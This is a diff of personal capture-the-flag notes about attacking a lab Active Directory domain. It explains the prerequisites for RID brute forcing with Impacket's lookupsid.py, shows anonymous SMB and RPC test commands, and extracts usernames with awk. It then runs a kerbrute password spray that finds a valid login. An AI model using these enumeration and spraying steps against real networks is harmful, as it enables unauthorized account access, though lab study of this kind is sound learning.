@@ -114,4 +114,62 @@ Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
 522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
 root@ip-10-201-48-39:/opt/impacket/examples# 
 
-AFTER RESETTING AGAIN I got the lookupsid.py to land
+AFTER RESETTING AGAIN I got the lookupsid.py to land apparently this was signaled as a possibility because of the read access on IPC$
+
+# Exact conditions / prerequisites
+
+1. **Network + ports**
+    
+    - Target reachable; SMB/RPC ports available: **445** (SMB over TCP) and/or **139**, and RPC endpoint mapper **135** may be involved.
+        
+    - Test: `nmap -p 135,139,445 -Pn <IP>`.
+        
+2. **IPC$ / named-pipe access (SMB session)**
+    
+    - You must be able to connect to the `\\IPC$` share (null/anonymous or with credentials) because the RPC named pipes are exposed via that session.
+        
+    - Test (anonymous/null):  
+        `smbclient //10.0.0.1/IPC$ -U "" -N`  
+        If that connects (or at least connects then denies a command), you have session-level access.
+        
+3. **RPC access to SAMR/LSA pipes**
+    
+    - The tool uses RPC calls on `\\PIPE\\samr` and/or `\\PIPE\\lsarpc`. The server must allow those RPC calls from your session.
+        
+    - Test: `rpcclient -U "" <IP>` then try `lookupnames` or `enumdomusers` if available; or run `enum4linux -a <host>` to see what RPC endpoints return.
+        
+4. **Null session vs authentication**
+    
+    - On older/poorly configured DCs, **anonymous (null) sessions** let you call the lookup RPCs — so you can run lookupsid with no creds. On modern/secure DCs, **you’ll need valid credentials** (domain user) to call these procedures.
+        
+    - If null-session is blocked, supply `-u USER -p PASS` to lookupsid.py or use a valid SMB bind.
+        
+5. **Domain SID or ability to discover it**
+    
+    - For RID brute force `lookupsid.py` needs the domain SID prefix (S-1-5-21-XXXX). You can:
+        
+        - Discover it from other enum tools (enum4linux, rpcclient, net, or rootDSE via LDAP if allowed), or
+            
+        - `lookupsid.py` may be able to query for the domain SID if RPC permissions allow.
+            
+    - Test: `enum4linux -a <host>` or `rpcclient -U "" <host> -c "lsaquery"` (formats vary) to get domain SID.
+
+root@ip-10-201-48-39:/opt/impacket/examples# awk '{ split($2,a,"\\\\\\\\"); print a[2] }' SIDBrute.txt > users.txt
+
+anyway we prune the output file to split column 2 after the backslash then print the second column. Bash makes you escape backslashes and so does awk so we end up with 4 \s just to escape one backslash delimiting how to split the array. Then print array a in column 2. Anyway, we can start password spraying from here.
+
+root@ip-10-201-48-39:~# kerbrute passwordspray --user-as-pass -d SOUPEDECODE.LOCAL --dc 10.201.9.75 users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 11/10/25 - Ronnie Flathers @ropnop
+
+2025/11/10 17:09:29 >  Using KDC(s):
+2025/11/10 17:09:29 >  	10.201.9.75:88
+
+2025/11/10 17:09:29 >  [+] VALID LOGIN:	 ybob317@SOUPEDECODE.LOCAL:ybob317
+2025/11/10 17:09:34 >  Done! Tested 1089 logins (1 successes) in 4.985 seconds
